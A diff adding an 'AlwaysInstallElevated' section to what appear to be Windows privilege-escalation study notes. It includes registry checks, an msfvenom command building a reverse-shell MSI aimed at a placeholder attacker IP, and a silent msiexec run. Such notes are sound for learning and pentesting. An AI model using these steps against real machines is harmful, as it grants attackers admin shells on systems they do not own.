@@ -91,3 +91,19 @@ To check the permissions on the executable: `icacls`:
 
 As shown in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. Meaning we can modify the `.bat` file and insert any payload we like.
     
+
+### AlwaysInstallElevated
+Windows installer files `.msi` are used to install apps on the system. They usually run with the privilege level of the user that starts it. These can be configured to run with higher privileges from any user account (even unprivileged). This could potentially allow us to generate a malicious **MSI** file that would run with admin privileges.
+
+This method requires two registry values to be set. You can query these from the command line:
+
+    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+To exploit this vuln, both should be set. Otherwise, exploitation is not possible. If these are set, you can generate a malicious `.msi` using `msfvenom` like so:
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+In this case we would use the Metasploit handler, and you can run the installer like:
+
+    C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
